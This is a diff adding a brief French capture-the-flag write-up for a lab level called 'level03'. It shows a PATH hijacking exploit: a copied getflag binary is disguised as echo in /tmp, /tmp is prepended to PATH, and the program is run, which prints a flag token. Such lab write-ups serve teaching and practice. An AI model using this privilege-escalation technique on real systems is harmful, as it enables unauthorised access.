@@ -1,0 +1,12 @@
+strings level03
+On remarque : /usr/bin/env echo exploit me
+
+On recherche donc le path de getflag qui est dans /bin et on le copie dans /tmp (seule zone ou l'on peut creer un fichier)
+
+cp /bin/getflag /tmp/echo
+
+export PATH=/tmp:$PATH
+Cela permet d'ajouter /tmp en endroit ou regarder pour les appel systeme (nous avons grace au cp fait passer getflag pour echo)
+
+./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
